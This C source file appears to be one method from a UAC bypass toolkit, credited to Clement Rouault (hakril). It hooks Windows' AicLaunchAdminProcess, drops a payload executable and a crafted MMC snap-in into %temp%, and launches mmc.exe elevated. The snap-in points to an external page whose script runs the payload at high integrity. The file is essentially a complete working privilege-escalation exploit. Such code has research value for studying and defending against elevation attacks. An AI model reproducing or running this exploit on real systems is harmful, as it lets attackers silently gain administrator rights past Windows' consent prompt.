/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017
*
*  TITLE:       HAKRIL.C
*
*  VERSION:     2.80
*
*  DATE:        30 July 2017
*
*  UAC bypass method from Clement Rouault aka hakril.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

LPWSTR g_SnapInParameters = NULL;
pfnAipFindLaunchAdminProcess g_OriginalFunction = NULL;

/*
* AicLaunchAdminProcessHook
*
* Purpose:
*
* Hook handler for tampering APPINFO params.
*
*/
ULONG_PTR WINAPI AicLaunchAdminProcessHook(
    LPWSTR lpApplicationName,
    LPWSTR lpParameters,
    DWORD UacRequestFlag,
    DWORD dwCreationFlags,
    LPWSTR lpCurrentDirectory,
    HWND hWnd,
    PVOID StartupInfo,
    PVOID ProcessInfo,
    ELEVATION_REASON *ElevationReason
)
{
    UNREFERENCED_PARAMETER(lpParameters);

    return g_OriginalFunction(lpApplicationName,
        g_SnapInParameters,
        UacRequestFlag,
        dwCreationFlags,
        lpCurrentDirectory,
        hWnd,
        StartupInfo,
        ProcessInfo,
        ElevationReason);
}

/*
* ucmMethodHakril
*
* Purpose:
*
* Bypass UAC by abusing "feature" of appinfo command line parser.
* (all bugs are features/not a boundary of %something% by MS philosophy)
* Command line parser logic allows execution of custom snap-in console as if it
* "trusted" by Microsoft, resulting in your code running inside MMC.exe on High IL.
*
* Trigger: custom console snap-in with shockwave flash object resulting in
* execution of remote script on local machine with High IL.
*
*/
BOOL ucmMethodHakril(
    PVOID ProxyDll,
    DWORD ProxyDllSize
)
{
    BOOL bResult = FALSE, bCond = FALSE, bExtracted = FALSE;
    ULONG DataSize = 0, SnapinSize = 0, ErrorCode = 0;
    SIZE_T Dummy;
    PVOID SnapinResource = NULL, SnapinData = NULL;
    PVOID ImageBaseAddress = NtCurrentPeb()->ImageBaseAddress;
    PVOID LaunchAdminProcessPtr = NULL;
    LPWSTR lpText;

    DWORD DllVirtualSize;
    PVOID EntryPoint, DllBase;
    PIMAGE_NT_HEADERS NtHeaders;

    WCHAR szBuffer[MAX_PATH * 2];
    SHELLEXECUTEINFO shinfo;

    do {

        //
        // Lookup AicLaunchAdminProcess routine pointer.
        //
        LaunchAdminProcessPtr = (PVOID)AipFindLaunchAdminProcess(&ErrorCode);
        if (LaunchAdminProcessPtr == NULL) {

            switch (ErrorCode) {

            case ERROR_PROC_NOT_FOUND:
                lpText = TEXT("The required procedure address not found.");
                break;

            default:
                lpText = TEXT("Unspecified error in AipFindLaunchAdminProcess.");
                break;
            }

            ucmShowMessage(lpText);
            break;
        }

        //
        // Decrypt and decompress custom Kamikaze snap-in.
        //
        SnapinResource = supLdrQueryResourceData(
            KAMIKAZE_ID,
            ImageBaseAddress,
            &DataSize);

        if (SnapinResource) {
            SnapinData = g_ctx.DecryptRoutine(SnapinResource, DataSize, &SnapinSize);
            if (SnapinData == NULL)
                break;
        }
        else
            break;

        //
        // Replace default Fubuki dll entry point with new and remove dll flag.
        //
        NtHeaders = RtlImageNtHeader(ProxyDll);
        if (NtHeaders == NULL)
            break;

        DllVirtualSize = 0;
        DllBase = PELoaderLoadImage(ProxyDll, &DllVirtualSize);
        if (DllBase) {

            //
            // Get the new entrypoint.
            //
            EntryPoint = PELoaderGetProcAddress(DllBase, "_FubukiProc3");
            if (EntryPoint == NULL)
                break;

            //
            // Set new entrypoint and recalculate checksum.
            //
            NtHeaders->OptionalHeader.AddressOfEntryPoint =
                (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);

            NtHeaders->FileHeader.Characteristics &= ~IMAGE_FILE_DLL;

            NtHeaders->OptionalHeader.CheckSum =
                supCalculateCheckSumForMappedFile(ProxyDll, ProxyDllSize);

            VirtualFree(DllBase, 0, MEM_RELEASE);

        }
        else
            break;


        //
        // Write Fubuki.exe to the %temp%
        //
        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx.szTempDirectory);
        Dummy = _strlen(szBuffer);
        _strcat(szBuffer, FUBUKI_EXE);

        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
            break;

        //
        // Write payload msc snap-in to the %temp%
        //
        // All payload of this msc file is a link to external site
        //
        // <String ID="3" Refs="1">https://hfiref0x.github.io/Beacon/uac/exec</String>
        //
        // Where contents of this page are the following:
        //
        // <html><body><script>external.ExecuteShellCommand("%temp%\\fubuki.exe", "%systemdrive%", "", "Restored");</script></body></html>
        // raw.githubusercontent.com/hfiref0x/Beacon/master/uac/exec.html
        // 
        szBuffer[Dummy] = 0;
        _strcat(szBuffer, KAMIKAZE_MSC);
        if (!supWriteBufferToFile(szBuffer, SnapinData, SnapinSize))
            break;

        bExtracted = TRUE;

        //
        // Allocate and fill snap-in parameters buffer.
        //
        g_SnapInParameters = supHeapAlloc(0x1000);
        if (g_SnapInParameters == NULL)
            break;

        _strcpy(g_SnapInParameters, TEXT("huy32,wf.msc \""));
        _strcat(g_SnapInParameters, szBuffer);
        _strcat(g_SnapInParameters, TEXT("\""));

        //
        // Setup inline hook.
        //
        if (MH_Initialize() != MH_OK)
            break;

#pragma warning(push)
#pragma warning(disable: 4054)//code to data
        if (MH_CreateHook((LPVOID)LaunchAdminProcessPtr,
            (LPVOID)AicLaunchAdminProcessHook,
            (LPVOID)&g_OriginalFunction) != MH_OK)
        {
            break;
        }
#pragma warning(pop)

        if (MH_EnableHook((LPVOID)LaunchAdminProcessPtr) != MH_OK)
            break;

        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));

        //
        // Run trigger application.
        //
        shinfo.cbSize = sizeof(shinfo);
        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shinfo.lpFile = MMC_EXE;
        shinfo.lpParameters = g_SnapInParameters;
        shinfo.lpDirectory = NULL;
        shinfo.lpVerb = RUNAS_VERB;
        shinfo.nShow = SW_SHOW;
        bResult = ShellExecuteEx(&shinfo);
        if (bResult) {
            if (WaitForSingleObject(shinfo.hProcess, 0x4e20) == WAIT_TIMEOUT)
                TerminateProcess(shinfo.hProcess, (UINT)-1);
            CloseHandle(shinfo.hProcess);
        }

    } while (bCond);

    //
    // Cleanup.
    //
    MH_Uninitialize();

    if (SnapinData) {
        RtlSecureZeroMemory(SnapinData, SnapinSize);
        Dummy = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &SnapinData, &Dummy, MEM_RELEASE);
    }

    if (g_SnapInParameters) {
        supHeapFree(g_SnapInParameters);
        g_SnapInParameters = NULL;
    }

    //
    // Remove our msc file. Fubuki should be removed by payload code itself as it will be locked on execution.
    //
    if (bExtracted) {
        _strcpy(szBuffer, g_ctx.szTempDirectory);
        _strcat(szBuffer, KAMIKAZE_MSC);
        DeleteFile(szBuffer);
    }

    return bResult;
}
